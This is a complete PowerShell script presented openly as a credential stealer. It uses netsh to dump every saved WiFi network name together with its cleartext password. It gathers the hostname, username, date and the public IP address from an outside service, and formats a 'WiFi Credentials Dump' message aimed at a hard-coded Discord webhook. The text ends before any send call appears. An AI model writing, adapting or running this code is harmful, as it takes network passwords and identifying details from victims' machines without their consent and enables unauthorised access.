# wifi.ps1 — grabs saved WiFi creds and ships to Discord

$webhook = "https://discord.com/api/webhooks/1526566178690961480/P2AGaxV10TiiooKfrfD6-7POJFOb5utzqodFz6tFBWjSL8eFwixnP0K35_mozCzeKkwn"
$botName = "wefibot"

# Pull every saved profile
$profiles = (netsh wlan show profiles) |
    Select-String "All User Profile" |
    ForEach-Object { ($_ -split ":")[1].Trim() }

$results = foreach ($p in $profiles) {
    $info = netsh wlan show profile name="$p" key=clear
    $pw   = ($info | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() })
    [PSCustomObject]@{
        SSID     = $p
        Password = if ($pw) { $pw } else { "<open / no key stored>" }
    }
}

# Machine context
$hostname = $env:COMPUTERNAME
$user     = $env:USERNAME
$ip       = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -ErrorAction SilentlyContinue).ip
$date     = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# Build a pretty table
$table = ($results | Format-Table -AutoSize | Out-String).Trim()

$msg = @"
**WiFi Credentials Dump**
Hostname: $hostname
Username: $user
IP Address: $ip
Date: $date

SSID      Password
------      --------
$results
"@
